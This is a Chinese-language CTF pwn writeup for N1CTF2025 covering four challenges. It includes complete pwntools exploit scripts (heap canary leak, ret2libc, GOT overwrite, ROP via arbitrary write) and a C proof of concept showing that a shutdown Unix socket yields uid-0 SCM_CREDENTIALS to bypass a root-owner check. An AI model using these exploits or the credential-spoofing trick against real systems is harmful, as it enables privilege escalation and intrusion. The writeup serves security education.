@@ -1,0 +1,571 @@
+export const layout = "#components/Page.js";
+export const title = "N1CTF2025 Writeup";
+export const description = "";
+export const created = "2025-11-05T15:29:18+08:00";
+
+# N1CTF2025 Pwn Writeup
+
+好好玩的比赛（x
+
+## nipple
+
+附件用 ida 打开之后返现很💩，c++ 写的，非常不好看，但是代码量不大，直接丢给 AI 分析一下。
+
+AI 太好用了你知道吗，基本上这道题的三个洞：信息泄漏、栈溢出、堆溢出都找到了。
+
+信息泄漏是每次 crate 创建后没有清空，利用 show 可以泄漏 pie 和 libc。但是 repack 功能有点变态，它会把形如 0x61 这种单字节拆分成 0x06 和 0x01 分别写入，也就是没办法在堆上写入指针了。
+
+那 tcache posioning 基本打不了了，考虑栈溢出，但是没有 canary，怎么泄漏呢.jpg
+
+发现如果通过 chunk overlap 把 tcache chunk 的 fd 和 canary 重叠起来，在加密函数时，就会把 canary 的每个字节的低半字节和 fd 的高半字节拼起来，这样就可以把 canary 最低位的 `\x00` 盖掉，然后就 leak 出来了。
+
+后面打 ret2libc 就行。
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import os
+context.binary = "./attachment"
+context.log_level = "debug"
+BIN = './attachment'
+libc = ELF('./libc.so.6')
+HOST = os.environ.get('HOST')
+PORT = int(os.environ.get('PORT', '0'))
+# io = remote("60.205.163.215", 36593)
+io = process(BIN)
+
+
+if args.G:
+    gdb.attach(io, """
+    breakrva 0x2a5f
+    """)
+
+
+def new(io, n):
+    io.sendlineafter(b'Choice:', b'1')
+    io.sendlineafter(b'Length', str(n).encode())
+    io.recvuntil(b'Data:')
+    io.sendline(b'')
+    io.recvuntil(b'[OK]')
+
+def inspect(io, i=0):
+    io.recvuntil(b'Choice:')
+    io.sendline(b'2')
+    io.sendlineafter(b'Index:', str(i).encode())
+
+def repack(io, i, n, data):
+    io.recvuntil(b'Choice:')
+    io.sendline(b'4')
+    io.sendlineafter(b'Index:', str(i).encode())
+    io.sendlineafter(b'Length', str(n).encode())
+    io.recvuntil(b'Data:')
+    io.send(data)
+    io.recvuntil(b'[OK]')
+
+def quit(io):
+    io.sendline(b'7')
+
+def poc_leak():
+    io = spawn()
+    new(io, 1024)
+    leak = inspect(io, 0)
+    log.info(f'leak len={len(leak)}')
+    quit(io)
+    io.close()
+
+def poc_heap():
+    io = spawn()
+    new(io, 10)
+    repack(io, 0, 22, b'B'*21)
+    quit(io)
+    io.close()
+
+def poc_stack():
+    io = spawn()
+    new(io, 64)
+    io.sendlineafter(b'Choice:', b'4')
+    io.sendlineafter(b'Index:', b'0')
+    io.sendlineafter(b'Length', b'128')
+    io.recvuntil(b'Data:')
+    io.sendline(b'C'*127)
+    io.close()
+
+
+for i in range(2):
+    new(io, 0x500)
+inspect(io, 1)
+libc_base = u64(io.recvuntil(b'\x0a')[-7:-1].ljust(8, b'\x00')) - 0x203b20
+
+for i in range(2):
+    new(io, 0x10)
+inspect(io, 2)
+heap_leak = u64(io.recvuntil(b'\x0a')[-6:-1].ljust(8, b'\x00')) << 12
+repack(io, 2, 0x20, b'a' * 0x18 + b'\x0a' + b'\x0a')  # 35CD
+print(hex(heap_leak))
+print(hex(libc_base))
+
+inspect(io, 2)
+io.recvuntil(b"aaaaaaaaaaaaaaaaaaaaaaaa")
+canary = u64(io.recvuntil(b"\x06\n", drop=True))
+print(hex(canary))
+
+pop_rdi_ret = 0x000000000010f78b+libc_base
+system = libc_base + libc.sym['system']
+binsh = next(libc.search(b"/bin/sh\x00")) + libc_base
+ret = libc_base + 0x000000000002882f
+
+payload = b"a" * 0x18 + p64(canary) + b"a" * 0x38 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)
+repack(io, 1, len(payload), payload)
+
+io.interactive()
+```
+
+
+~~脚本的交互部分是 AI 一把梭的，有点丑~~
+
+
+## ktou
+
+还以为是 kernel pwn，其实还是用户态。
+
+![漏洞点](https://pic1.imgdb.cn/item/690b14f23203f7be00d60d45.png)
+
+这个地方存在整数溢出，可以拿到用户态任意地址读写的原语。
+
+User 程序 got 表可写，功能 5 有 `puts(dest)`，把 dest 写成 binsh，puts@got 写成 `system` 即可。
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import os
+import base64
+context.terminal = ['tmux', 'splitw', '-h']
+context.log_level = "debug"
+BIN = './core/user'
+libc=ELF('./libc.so.6')
+io = remote("60.205.163.215", 60007)
+
+def choose(idx):
+    io.sendlineafter(b'> ',str(idx))
+def kwrite(idx,size,data):
+    choose(2)
+    io.sendlineafter(b': ',str(idx))
+    io.sendlineafter(b': ',str(size))
+    io.sendlineafter(b': ',data)
+
+def kappend(idx,size,data):
+    choose(3)
+    io.sendlineafter(b': ',str(idx))
+    io.sendlineafter(b': ',str(size))
+    io.sendlineafter(b': ',data)
+def kwdescription(data):
+    choose(5)
+    io.sendlineafter(b':',data)
+
+#io.sendline(b'aaa')
+kwrite(1,0xf0,p64(0xdeadbeef))
+kappend(0xf,0xff,p64(0x405050)+p64(0xdeadbeef))
+choose(4)
+io.recvuntil(b'content:\x20\x0d\x0a')
+
+system = u64(io.recv(6).ljust(8,b'\x00')) + libc.sym['system'] - 0x606f0
+kappend(0xf,0xff,p64(0x405220)+p64(0xdeadbeef))
+
+payload=base64.b64encode(b'/bin/sh\x00\x00')
+kwdescription(payload)
+kappend(0xf,0xff,p64(0x405030)+p64(0xdeadbeef))
+payload=base64.b64encode(p64(system))
+kwdescription(payload)
+
+io.interactive()
+```
+
+
+## n1drone
+
+先用 dockerfile.run 文件把环境搭出来，简单测试一下功能。
+
+看一下出题人给的 n1_sub_manager_main.cpp，相当于给了任意地址读写的原语。
+
+另外发现 `list_tasks` 可以泄漏 `tls` 地址，在它下面就有 libc 指针和 stack 指针。
+
+非预期：通过 `bsondump /proc/self/maps` 可以泄漏 pie 出来。
+
+有了栈地址，可以像堆题打 `environ` 一样，直接去打 edit chunk 那个函数的返回地址，这个题就是直接打 `n1_sub_manager write` 的返回地址就可以了
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./run/bin/px4"
+context.log_level = "info"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("127.0.0.1", 8080) if argv[1] == 'r' else process(proc)
+libc = ELF("./libc.so.6")
+
+
+def choose(cmd):
+    io.sendlineafter(b"pxh>", cmd)
+
+
+def arbread(addr):
+    cmd = f"n1_sub_manager write 0x24 {hex(addr)}"
+    choose(cmd.encode())
+    choose(b"listener debug_key_value")
+    io.recvuntil(b"timestamp: ")
+    return int(io.recvuntil(b" (", drop=True))
+
+
+def arbwrite(addr, content):
+    cmd = f"n1_sub_manager write 0x23 {hex(addr)}"
+    choose(cmd.encode())
+    cmd = "n1_sub_manager publish 0x23"
+    choose(cmd.encode())
+    io.send(content)
+
+
+cmd = "n1_sub_manager publish 0x24"
+choose(cmd.encode())
+io.sendline(b"a" * 0x2)
+choose(b"list_tasks")
+io.recvuntil(b"hpwork")
+tls_addr = int(io.recvuntil(b"\n", drop=True))
+log.info(f"tls_addr => {hex(tls_addr)}")
+
+leak_addr = arbread(tls_addr + 0x2f8)
+log.info(f"leak_addr => {hex(leak_addr)}")
+
+libc_addr = arbread(leak_addr) - 0x93720
+log.info(f"libc_addr => {hex(libc_addr)}")
+
+pop_rdi_ret = libc_addr + 0x000000000002a3e5
+ret = pop_rdi_ret + 1
+system = libc_addr + libc.sym['system']
+binsh = libc_addr + next(libc.search(b"/bin/sh\x00"))
+
+leak_addr = arbread(tls_addr + 0x300)
+log.info(f"leak_addr => {hex(leak_addr)}")
+stack_addr = arbread(leak_addr)
+log.info(f"stack_addr => {hex(stack_addr)}")
+
+cmd = "n1_sub_manager publish 0x23"
+choose(cmd.encode())
+io.send(b"\x00" * 0x40)
+pause()
+arbwrite(stack_addr - 0x28, flat([pop_rdi_ret, binsh, ret, system]).ljust(0x100, b"\x00"))
+
+io.interactive()
+```
+
+像这种附件运行在 docker 里，通过 `socat` 转发 stdin/stdout 到端口的题目，一般调试都是用 `socat TCP-LISTEN:8083,fork EXEC:"gdbserver \:9999 ./bin/px4"` 调试的，但是这道题目启动脚本里有 `echo` 命令，由于 stdin/stdout 被转发了，所以会报错。
+
+有一个更简单的办法是，由于 docker 是通过 namespace 实现的，本机上是可以直接找到进程的，所以完全可以不用 gdbserver，直接先 `nc` 上去，然后 `gdb -pid <pid>` 调试，这样就能发现任意地址写的时候的一些坑2333。
+
+
+很有意思的题，给东风师傅点赞。
+
+## n1flgsrv
+
+这个题很好玩，给了一个 `srv` 程序和 `cli` 程序。
+
+主要关注 init 文件的这两行：
+
+```bash
+chroot /srv /srv & >/dev/null 2>/dev/null
+chrooot 1337 1337 /cli /cli
+```
+
+简单解释一下，`srv` 进程以 root (uid 0) 身份运行，其 chroot 根目录是 `/srv`。`cli` 进程以 uid 1337 身份运行，其 chroot 根目录是 `/cli`。
+
+当我们连接到 `n1ctf.2025.remote:13227` 时，我们首先交互的是 `cli` 进程。
+
+首先分析 cli，程序扣了符号表，可以用 sig 文件简单恢复一下，然后拖给 ai 分析。
+
+逆向一下逻辑，发现 `sub_4EC110((unsigned int)"%[^\n]%1[\n]", (unsigned int)v62, ...)` 这一行是 `scanf("%[^\n]", v62)`。`scanf` 没有检查输入的长度，它会无限地写入 `v62`，导致经典的栈溢出。
+
+然后分析一下 srv，恢复符号后，简单逆向，发现大概功能是：读入一个文件名，尝试读取，如果文件的 owner 是 root，就返回文件内容，这个逻辑本身是没什么漏洞的，问题是经过上面的 `chroot` 之后，当前进程的 uid 是 1337，当我们通过 cli 和 srv 交互发送一个 `/flag` 时，srv 检查发现 flag 文件的 owner 是 0，无法读取 flag。
+
+补充一些知识：
+
+### SCM_CREDENTIALS
+
+`SCM_CREDENTIALS` 是一个在 Linux/Unix 系统中用于在进程间传递身份凭证的机制。
+
+为了完全理解它，我们先退一步，看看它解决了什么问题。
+
+#### 1. 问题：服务器如何信任客户端？
+
+想象一下，你有一个特权服务器（比如 `srv`），它监听一个 UNIX 套接字。
+
+一个客户端（比如 `cli`）连接到它，并发送一个请求：“请读取 `/flag` 文件”。
+
+`srv` 进程如何知道这个请求是谁（哪个用户）发出的？
+
+  * `srv` 不能信任 `cli` 发送的数据。`cli` 不能简单地在消息里说：“你好，我是 uid 1337”。这太容易伪造了。
+  * `srv` 需要一种**无法伪造**的方式来获取 `cli` 的真实用户 ID (UID)。
+
+#### 2. 解决方案：`SO_PASSCRED` 和 `SCM_CREDENTIALS`
+
+`SCM_CREDENTIALS` 就是这个问题的答案。它代表 **S**ocket-**C**ontrol-**M**essage **CREDEN**TIALS（套接字控制消息 - 凭证）。
+
+这是一个两步的过程：
+
+**第 1 步：服务器开启“凭证接收”模式**
+
+  * `srv`（服务器）在与 `cli`（客户端）建立连接后，必须对该连接的文件描述符（`fd`）设置一个选项：
+    ```c
+    int enable = 1;
+    setsockopt(client_fd, SOL_SOCKET, SO_PASSCRED, &enable, sizeof(enable));
+    ```
+  * `sub_4075F0` 函数中的 `sub_5351A0(v10, 1, 16, &v16, 4)` **做的就是这件事**。
+  * `SO_PASSCRED` (Pass Credentials) 选项告诉 Linux 内核：“**请在每次从这个套接字接收数据时，把发送方的真实凭证（PID, UID, GID）也一并交给我。**”
+
+**第 2 步：服务器使用 `recvmsg` 接收凭证**
+
+  * 当 `cli` 发送数据时，`srv` 不能再使用简单的 `read()` 或 `recv()`。它必须使用 `recvmsg()`。
+  * `recvmsg()` 是一个更高级的函数，它允许在接收“常规数据”的同时，接收“**控制消息**”（Control Message，即 `cmsg`）。
+  * 当 `cli` 发送消息时，Linux 内核会介入：
+    1.  它查看 `cli` 进程，确认其真实 UID 是 1337。
+    2.  它将 `cli` 的数据（例如 `"/flag"`）放入“常规数据”缓冲区。
+    3.  它创建一个**控制消息**，类型为 `SCM_CREDENTIALS`，内容为 `(pid, uid=1337, gid=1337)`。
+    4.  它将这个控制消息放入“控制消息”缓冲区。
+    5.  `srv` 的 `recvmsg()` 调用返回，`srv` 现在同时拥有了数据 (`"/flag"`) 和一个**由内核担保、无法伪造**的凭证（`uid=1337`）。
+
+
+而 `shutdown` 函数，可以做到让 srv 获得一个 uid = 0 的空凭证。
+
+1. 当客户端 `shutdown` 时，`sk->sk_peer_cred` 会被设置为 `NULL`
+2. srv 随后调用 recvmsg 接收 EOF
+3. 通过下面这个函数设置 `client->uid = 0`
+
+
+```c
+static void unix_get_peereid(struct socket *sock, struct ucred *ucred)
+{
+    struct sock *sk = sock->sk;
+    const struct cred *peercred;
+
+    /*
+     * We can't return PID of peer for an unconnected socket.
+     * We are not allowed to return credentials of not-our-peer.
+     */
+    if (sk->sk_peer_cred == NULL) {
+        /*
+         * sk_peer_cred is cleared in unix_shutdown()
+         * or when the peer is garbage collected.
+         */
+        peercred = &init_cred; // <-- 关键点 1
+    } else {
+        peercred = sk->sk_peer_cred;
+    }
+
+    ucred->pid = 0; // PID 不总是可用的
+    ucred->uid = peercred->uid; // <-- 关键点 2
+    ucred->gid = peercred->gid;
+}
+```
+
+
+来看下面这个 poc:
+
+`server.c`：
+
+```c
+#define _GNU_SOURCE
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <sys/types.h>
+
+#define SOCKET_PATH "shutdown_quirk.sock"
+
+int main() {
+    int server_fd, client_fd;
+    struct sockaddr_un server_addr;
+
+    server_fd = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (server_fd == -1) {
+        perror("socket");
+        exit(EXIT_FAILURE);
+    }
+
+    unlink(SOCKET_PATH);
+
+    memset(&server_addr, 0, sizeof(struct sockaddr_un));
+    server_addr.sun_family = AF_UNIX;
+    strncpy(server_addr.sun_path, SOCKET_PATH, sizeof(server_addr.sun_path) - 1);
+
+    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr_un)) == -1) {
+        perror("bind");
+        exit(EXIT_FAILURE);
+    }
+
+    if (listen(server_fd, 5) == -1) {
+        perror("listen");
+        exit(EXIT_FAILURE);
+    }
+
+    printf("Server listening on %s\n", SOCKET_PATH);
+
+    client_fd = accept(server_fd, NULL, NULL);
+    if (client_fd == -1) {
+        perror("accept");
+        exit(EXIT_FAILURE);
+    }
+    printf("Client connected.\n");
+
+    int enable = 1;
+    if (setsockopt(client_fd, SOL_SOCKET, SO_PASSCRED, &enable, sizeof(enable)) == -1) {
+        perror("setsockopt(SO_PASSCRED)");
+        exit(EXIT_FAILURE);
+    }
+    printf("SO_PASSCRED enabled.\n");
+
+    struct msghdr msg = {0};
+    struct iovec iov[1] = {0};
+    char buf[1];
+
+    iov[0].iov_base = buf;
+    iov[0].iov_len = sizeof(buf);
+    msg.msg_iov = iov;
+    msg.msg_iovlen = 1;
+
+    char cmsg_buf[CMSG_SPACE(sizeof(struct ucred))] = {0};
+    msg.msg_control = cmsg_buf;
+    msg.msg_controllen = sizeof(cmsg_buf);
+
+    printf("Waiting for recvmsg()...\n");
+    ssize_t n = recvmsg(client_fd, &msg, 0);
+
+    if (n == -1) {
+        perror("recvmsg");
+        exit(EXIT_FAILURE);
+    }
+
+    printf("recvmsg() returned %zd (EOF)\n", n);
+
+    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
+    if (cmsg == NULL) {
+        printf("No control message (cmsg) received.\n");
+        exit(EXIT_FAILURE);
+    }
+
+    if (cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_CREDENTIALS) {
+        printf("Received SCM_CREDENTIALS.\n");
+        struct ucred *creds = (struct ucred *)CMSG_DATA(cmsg);
+
+        printf("----------------------------------\n");
+        printf("  PID: %d\n", creds->pid);
+        printf("  UID: %u\n", (unsigned int)creds->uid); /* 修正：使用 %u 打印 uid_t */
+        printf("  GID: %u\n", (unsigned int)creds->gid); /* 修正：使用 %u 打印 gid_t */
+        printf("----------------------------------\n");
+
+        if (creds->uid == 0 && creds->gid == 0) {
+            printf("SUCCESS: Kernel quirk verified! Received null credentials.\n");
+        } else {
+            printf("FAILURE: Received non-null credentials.\n");
+        }
+
+    } else {
+        printf("Received an unknown control message.\n");
+    }
+
+    close(client_fd);
+    close(server_fd);
+    unlink(SOCKET_PATH);
+    return 0;
+}
+```
+
+
+`client.c`：
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+
+#define SOCKET_PATH "shutdown_quirk.sock"
+
+int main() {
+    int client_fd;
+    struct sockaddr_un server_addr;
+
+    client_fd = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (client_fd == -1) {
+        perror("socket");
+        exit(EXIT_FAILURE);
+    }
+
+    memset(&server_addr, 0, sizeof(struct sockaddr_un));
+    server_addr.sun_family = AF_UNIX;
+    strncpy(server_addr.sun_path, SOCKET_PATH, sizeof(server_addr.sun_path) - 1);
+
+    if (connect(client_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr_un)) == -1) {
+        perror("connect");
+        exit(EXIT_FAILURE);
+    }
+
+    printf("Connected to server.\n");
+
+    printf("Calling shutdown(SHUT_WR)...\n");
+    if (shutdown(client_fd, SHUT_WR) == -1) {
+        perror("shutdown");
+        exit(EXIT_FAILURE);
+    }
+
+    printf("Waiting for 2 seconds before closing...\n");
+    sleep(2);
+
+    close(client_fd);
+    printf("Client exiting.\n");
+    return 0;
+}
+```
+
+编译，运行，发现：
+
+```
+$ ./server
+Server listening on shutdown_quirk.sock
+Client connected.
+SO_PASSCRED enabled.
+Waiting for recvmsg()...
+recvmsg() returned 0 (EOF)
+Received SCM_CREDENTIALS.
+----------------------------------
+PID: 0
+UID: 0
+GID: 0
+----------------------------------
+SUCCESS: Kernel quirk verified! Received null credentials.
+```
+
+所以只需要栈溢出，执行 shellcode 就可以，shellcode 逻辑如下：
+
+1. `read(0, ...)` 读入 `b"/flag\x00"` 字符串
+2. `write(3, ...)`：将 `/flag` 路径写入 `fd 3`，发送给 srv。
+3. `shutdown(3)`：shellcode 关闭了 `fd 3` 的写入端，且设置 `uid = 0`
+4. `read(3, ...)`：从 `fd 3` 读取 srv 的响应（即 flag）。
+5. `write(1, ...)`：将响应（flag）写入 `fd 1`（stdout），从而收到 flag。
+
+
+注意 `shutdown` 和 `close` 的区别：
+
+`close(fd)` 做两件事：
+
+1. 关闭写入信道（向服务器发送 FIN 包，告诉它“我发完了”）。
+2. 关闭读取信道（不再接收来自服务器的数据）。
+
+`shutdown(fd, SHUT_WR)`（SHUT_WR = Shutdown Write）是一个更精细的函数。它只做一件事：
+
+1. 关闭写入信道（向服务器发送 FIN 包，告诉它“我发完了”）。
+2. 但它保持读取信道处于打开 (OPEN) 状态！
